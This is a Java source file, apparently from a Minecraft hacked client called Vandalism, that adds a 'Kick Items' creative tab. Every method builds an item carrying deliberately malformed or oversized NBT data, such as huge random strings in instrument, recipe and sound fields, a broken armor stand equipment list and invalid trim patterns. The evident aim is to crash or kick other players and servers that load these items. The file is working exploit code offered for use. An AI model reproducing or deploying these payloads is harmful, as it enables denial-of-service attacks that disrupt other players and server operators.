/*
 * This file is part of Vandalism - https://github.com/VandalismDevelopment/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, FooFieOwO and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.integration.creativetab.impl;

import de.florianmichael.rclasses.common.RandomUtils;
import de.nekosarekawaii.vandalism.integration.creativetab.AbstractCreativeTab;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.List;

import static de.nekosarekawaii.vandalism.util.game.ItemStackUtil.withClientSide;

public class KickItemsCreativeTab extends AbstractCreativeTab {

    public KickItemsCreativeTab() {
        super(Text.literal("Kick Items"), Items.FIREWORK_ROCKET);
    }

    @Override
    public void exposeItems(final List<ItemStack> items) {
        items.add(withClientSide(createKickHead(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Kick Head")));
        items.add(withClientSide(createKickHeadV2(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Kick Head V2")));
        items.add(withClientSide(createKickStand(), Text.literal(Formatting.GOLD + Formatting.BOLD.toString() + "Kick Stand")));
        items.add(withClientSide(createKickStandV2(), Text.literal(Formatting.GOLD + Formatting.BOLD.toString() + "Kick Stand V2")));
        items.add(withClientSide(createKickKnowledgeBook(), Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Kick Knowledge Book")));
        items.add(withClientSide(createKickHorn(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Kick Horn")));
    }

    private static ItemStack createKickHead() {
        final ItemStack item = new ItemStack(Items.PLAYER_HEAD);
        final NbtCompound base = new NbtCompound();
        base.putString("SkullOwner", " ");
        item.setNbt(base);
        return item;
    }

    private static ItemStack createKickHeadV2() {
        final ItemStack item = new ItemStack(Items.PLAYER_HEAD);
        final NbtCompound base = new NbtCompound();
        final NbtCompound blockEntityTag = new NbtCompound();
        blockEntityTag.putString("note_block_sound", RandomStringUtils.randomAlphabetic(5).toLowerCase().repeat(6552));
        base.put("BlockEntityTag", blockEntityTag);
        item.setNbt(base);
        return item;
    }

    private static ItemStack createKickStand() {
        final ItemStack item = new ItemStack(Items.ARMOR_STAND);
        final NbtCompound base = new NbtCompound();
        final NbtCompound entityTag = new NbtCompound();
        final NbtList equipment = new NbtList();
        final NbtCompound emptyEquipment = new NbtCompound();
        for (int i = 0; i < 4; i++) {
            equipment.add(emptyEquipment);
        }
        final NbtCompound helmet = new NbtCompound();
        helmet.putByte("Count", (byte) 1);
        helmet.putString("id", "leather_helmet");
        final NbtCompound helmetTag = new NbtCompound();
        final NbtCompound display = new NbtCompound();
        display.putInt("color", Integer.MAX_VALUE);
        helmetTag.put("display", display);
        helmet.put("tag", helmetTag);
        equipment.add(helmet);
        entityTag.put("Equipment", equipment);
        base.put("EntityTag", entityTag);
        item.setNbt(base);
        return item;
    }

    private static ItemStack createKickStandV2() {
        final ItemStack item = new ItemStack(Items.ARMOR_STAND);
        final NbtCompound base = new NbtCompound();
        final NbtCompound entityTag = new NbtCompound();
        final NbtList armorItems = new NbtList();
        final NbtCompound firstArmorItem = new NbtCompound();
        final NbtCompound armorItemBase = new NbtCompound();
        final NbtCompound armorTrim = new NbtCompound();
        armorTrim.putString("pattern", RandomStringUtils.random(5).toLowerCase() + ":" + RandomStringUtils.random(5).toUpperCase());
        armorTrim.putString("material", "minecraft:amethyst");
        armorItemBase.put("Trim", armorTrim);
        firstArmorItem.put("tag", armorItemBase);
        firstArmorItem.putByte("Count", (byte) 1);
        firstArmorItem.putString("id", "minecraft:diamond_helmet");
        armorItems.add(firstArmorItem);
        entityTag.put("ArmorItems", armorItems);
        base.put("EntityTag", entityTag);
        item.setNbt(base);
        return item;
    }

    private static ItemStack createKickKnowledgeBook() {
        final ItemStack item = new ItemStack(Items.KNOWLEDGE_BOOK);
        final NbtCompound base = new NbtCompound();
        final NbtList recipes = new NbtList();
        recipes.add(0, NbtString.of(
                "Hacked:" + RandomUtils.randomString(
                        15000,
                        true,
                        true,
                        true,
                        true
                )
        ));
        base.put("Recipes", recipes);
        item.setNbt(base);
        return item;
    }

    private static ItemStack createKickHorn() {
        final ItemStack item = new ItemStack(Items.GOAT_HORN);
        final NbtCompound base = new NbtCompound();
        base.putString("instrument", RandomStringUtils.random(21900));
        item.setNbt(base);
        return item;
    }

}
